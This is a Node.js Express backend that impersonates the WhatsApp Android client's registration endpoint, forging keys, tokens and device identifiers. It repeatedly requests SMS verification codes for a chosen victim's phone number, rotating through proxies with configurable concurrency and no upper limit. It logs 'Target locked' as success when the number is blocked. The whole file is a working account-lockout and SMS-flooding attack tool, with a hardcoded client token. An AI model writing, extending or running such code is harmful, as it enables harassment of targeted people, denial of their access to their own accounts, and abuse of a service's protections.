const express = require('express');
const cors = require('cors');
const axios = require('axios');
const crypto = require('crypto');
const { v4: uuidv4 } = require('uuid');
const { HttpsProxyAgent } = require('https-proxy-agent');
const curve = require('curve25519-js');
const mccMncData = require('./mcc_mnc');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());

const PORT = process.env.PORT || 3000;
const ACCESS_PASSWORD = process.env.ACCESS_PASSWORD || 'admin123';
const DEFAULT_MOBILE_TOKEN = '0a1mLfGUIBVrMKF1RdvLI5lkRBvof6vn0fD2QRSM4174c0243f5277a5d7720ce842cc4ae6';

// State management
let isRunning = false;
let currentTask = null;
let logs = [];
let proxies = [];

function addLog(message) {
    const entry = `[${new Date().toISOString()}] ${message}`;
    logs.push(entry);
    if (logs.length > 100) logs.shift();
    console.log(entry);
}

// Utility functions for registration
const MOBILE_REGISTRATION_ENDPOINT = 'https://v.whatsapp.net/v2';
const MOBILE_USERAGENT = 'WhatsApp/2.23.12.78 Android/13 Device/samsung-SM-G991B';

function urlencode(str) {
    return str.replace(/-/g, '%2d').replace(/_/g, '%5f').replace(/~/g, '%7e');
}

function convertBufferToUrlHex(buffer) {
    let result = '';
    buffer.forEach((x) => {
        result += `%${x.toString(16).padStart(2, '0').toLowerCase()}`;
    });
    return result;
}

function toBase64Url(buf) {
    return Buffer.from(buf).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

async function requestOTP(cc, number, session, proxyUrl = null) {
    const nationalNumber = number.replace(/[/-\s)(]/g, '').trim();

    const pubKeyToSign = Buffer.concat([Buffer.from([0x05]), session.signedPrePubKey]);
    const signature = Buffer.from(curve.sign(session.identityPrivKey, pubKeyToSign));

    const tokenSource = Buffer.concat([session.mobileToken, Buffer.from(nationalNumber)]);
    const token = crypto.createHash('md5').update(tokenSource).digest('hex');

    const params = {
        cc, in: nationalNumber, Rc: '0', lg: 'en', lc: 'GB', mistyped: '6',
        authkey: session.noisePubKeyB64,
        e_regid: session.regIdB64,
        e_keytype: 'BQ',
        e_ident: session.identityPubKeyB64,
        e_skey_id: 'AAAA',
        e_skey_val: session.signedPrePubKeyB64,
        e_skey_sig: toBase64Url(signature),
        fdid: session.fdid, network_ratio_type: '1', expid: session.expid, simnum: '1',
        hasinrc: '1', pid: Math.floor(Math.random() * 1000).toString(),
        id: session.identityId, backup_token: session.backupToken,
        token, mcc: session.mcc.padStart(3, '0'), mnc: session.mnc.padStart(3, '0'),
        sim_mcc: '000', sim_mnc: '000', method: 'sms', reason: '', hasav: '1'
    };

    const queryString = Object.keys(params).map(key => `${key}=${urlencode(params[key].toString())}`).join('&');
    const url = `${MOBILE_REGISTRATION_ENDPOINT}/code?${queryString}`;

    try {
        const config = {
            headers: {
                'User-Agent': MOBILE_USERAGENT,
                'Accept': 'application/json'
            },
            timeout: 10000
        };

        if (proxyUrl) {
            config.httpsAgent = new HttpsProxyAgent(proxyUrl);
            config.proxy = false;
        }

        const response = await axios.get(url, config);
        return response.data;
    } catch (error) {
        return error.response ? error.response.data : { error: error.message };
    }
}

// Authentication Middleware
const authMiddleware = (req, res, next) => {
    const password = req.headers['x-password'];
    if (password === ACCESS_PASSWORD) {
        next();
    } else {
        res.status(401).json({ error: 'Unauthorized' });
    }
};

// API Endpoints
app.get('/health', (req, res) => res.send('Backend is healthy'));

app.post('/verify-password', (req, res) => {
    const { password } = req.body;
    if (password === ACCESS_PASSWORD) {
        res.json({ success: true });
    } else {
        res.status(401).json({ success: false });
    }
});

app.get('/status', authMiddleware, (req, res) => {
    res.json({ isRunning, currentTask, logs, proxies });
});

app.get('/proxies', authMiddleware, (req, res) => {
    res.json(proxies);
});

app.post('/proxies', authMiddleware, async (req, res) => {
    const { url } = req.body;
    if (!url) return res.status(400).json({ error: 'Proxy URL is required' });

    try {
        const agent = new HttpsProxyAgent(url);
        await axios.get('https://v.whatsapp.net/v2/code', {
            httpsAgent: agent,
            proxy: false,
            timeout: 5000,
            validateStatus: () => true
        });

        const id = uuidv4();
        proxies.push({ id, url, status: 'active', lastChecked: new Date().toISOString() });
        res.json({ success: true, id });
    } catch (error) {
        res.status(400).json({ error: 'Proxy health check failed: ' + error.message });
    }
});

app.delete('/proxies/:id', authMiddleware, (req, res) => {
    proxies = proxies.filter(p => p.id !== req.params.id);
    res.json({ success: true });
});

app.post('/proxies/test', authMiddleware, async (req, res) => {
    const { url, testUrl } = req.body;
    const target = testUrl || 'https://v.whatsapp.net/v2/code';

    try {
        const agent = new HttpsProxyAgent(url);
        const startTime = Date.now();
        await axios.get(target, {
            httpsAgent: agent,
            proxy: false,
            timeout: 5000,
            validateStatus: () => true
        });
        const latency = Date.now() - startTime;
        res.json({ success: true, latency });
    } catch (error) {
        res.json({ success: false, error: error.message });
    }
});

app.post('/proxies/check-all', authMiddleware, async (req, res) => {
    const results = [];
    for (let proxy of proxies) {
        try {
            const agent = new HttpsProxyAgent(proxy.url);
            await axios.get('https://v.whatsapp.net/v2/code', {
                httpsAgent: agent,
                proxy: false,
                timeout: 5000,
                validateStatus: () => true
            });
            proxy.status = 'active';
        } catch (error) {
            proxy.status = 'dead';
        }
        proxy.lastChecked = new Date().toISOString();
        results.push(proxy);
    }
    res.json(results);
});

app.post('/start', authMiddleware, (req, res) => {
    if (isRunning) return res.status(400).json({ error: 'Already running' });

    const { cc, number, delay, maxRequests, mobileToken, concurrency, mcc: customMcc, mnc: customMnc } = req.body;
    if (!cc || !number) return res.status(400).json({ error: 'Missing parameters' });

    const mcc = customMcc || mccMncData[cc] || '724';
    const mnc = customMnc || '001';

    // Session-level parameters
    const identityKey = curve.generateKeyPair(crypto.randomBytes(32));
    const noiseKey = curve.generateKeyPair(crypto.randomBytes(32));
    const signedPreKey = curve.generateKeyPair(crypto.randomBytes(32));
    const regId = Uint16Array.from(crypto.randomBytes(2))[0] & 16383;
    const e_regid_buf = Buffer.alloc(4);
    e_regid_buf.writeInt32BE(regId);

    const session = {
        mobileToken: Buffer.from(mobileToken || DEFAULT_MOBILE_TOKEN),
        identityPrivKey: Buffer.from(identityKey.private),
        identityPubKey: Buffer.from(identityKey.public),
        identityPubKeyB64: toBase64Url(identityKey.public),
        noisePubKeyB64: toBase64Url(noiseKey.public),
        signedPrePubKey: Buffer.from(signedPreKey.public),
        signedPrePubKeyB64: toBase64Url(signedPreKey.public),
        regIdB64: toBase64Url(e_regid_buf),
        fdid: uuidv4(),
        expid: toBase64Url(crypto.randomBytes(16)),
        identityId: convertBufferToUrlHex(crypto.randomBytes(20)),
        backupToken: convertBufferToUrlHex(crypto.randomBytes(20)),
        mcc,
        mnc
    };

    isRunning = true;
    currentTask = { cc, number, delay, maxRequests, concurrency, mcc, mnc };
    logs = [];
    addLog(`Starting task for +${cc}${number} (Concurrency: ${concurrency || 1})`);

    const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));

    (async () => {
        let count = 0;
        const totalRequests = parseInt(maxRequests) || Infinity;
        const parallel = parseInt(concurrency) || 1;
        let proxyIndex = 0;

        while (isRunning && count < totalRequests) {
            const batch = [];
            const remaining = totalRequests - count;
            const currentBatchSize = Math.min(parallel, remaining);

            for (let i = 0; i < currentBatchSize; i++) {
                const activeProxies = proxies.filter(p => p.status === 'active' || p.status === 'unknown');
                let proxyUrl = null;

                if (activeProxies.length > 0) {
                    proxyUrl = activeProxies[proxyIndex % activeProxies.length].url;
                    proxyIndex++;
                }

                batch.push((async (idx, pUrl) => {
                    const res = await requestOTP(cc, number, session, pUrl);
                    addLog(`Request #${idx} ${pUrl ? '(via proxy)' : ''} Result: ${JSON.stringify(res)}`);
                    if (res.reason === 'temporarily_unavailable') {
                        addLog(`Success: Target locked (temporarily_unavailable).`);
                    }
                })(count + i + 1, proxyUrl));
            }
            await Promise.all(batch);
            count += currentBatchSize;

            if (count < totalRequests && isRunning) {
                await wait(parseInt(delay) || 5000);
            }
        }
        isRunning = false;
        currentTask = null;
        addLog('Task finished.');
    })();

    res.json({ success: true });
});

app.post('/stop', authMiddleware, (req, res) => {
    isRunning = false;
    currentTask = null;
    addLog('Stopping task...');
    res.json({ success: true });
});

app.listen(PORT, () => {
    console.log(`Backend server listening on port ${PORT}`);
});
